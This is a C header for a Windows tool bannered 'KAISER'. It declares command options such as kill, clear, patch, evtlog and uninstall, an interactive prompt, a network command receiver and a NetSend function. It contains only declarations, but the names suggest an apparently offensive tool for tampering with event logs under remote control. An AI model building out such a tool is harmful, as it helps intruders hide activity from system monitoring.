#pragma once
#ifndef __COMMAND_H__
#define __COMMAND_H__

#include <Windows.h>

#define OPTION_STRING_HELP L"help"
#define OPTION_STRING_STATUS L"status"
#define OPTION_STRING_START L"start"
#define OPTION_STRING_STOP L"stop"
#define OPTION_STRING_ENABLE L"enable"
#define OPTION_STRING_DISABLE L"disable"
#define OPTION_STRING_KILL L"kill"
#define OPTION_STRING_CLEAR L"clear"
#define OPTION_STRING_PATCH L"patch"
#define OPTION_STRING_INTERACTIVE L"interactive"
#define OPTION_STRING_EVTLOG L"evtlog"
#define OPTION_STRING_UNINSTALL L"uninstall"
#define OPTION_STRING_ALL L"all"

#define KAISER_BANNER L"\n\t\t.:: KAISER ::.\n\n"
#define KAISER_PROMPT L"KAISER> "

// Command module definition.
typedef ULONG(*LPCOMMAND_FUNC)(INT argc, LPWSTR *argv);

typedef struct _COMMAND_LIST {
	LPCOMMAND_FUNC lpFunction;
	LPCWSTR lpCommandName;
	LPCWSTR lpDescription;
} COMMAND_LIST;

typedef struct _COMMAND_PARAMETERS {
	LPCOMMAND_FUNC lpFunction;
	LPWSTR lpCmdLine;
} COMMAND_PARAMETERS, *LPCOMMAND_PARAMETERS;

ULONG CommandStartReceiver(void);
INT NetSend(LPCWSTR fmt, ...);
#endif // !__COMMAND_H__
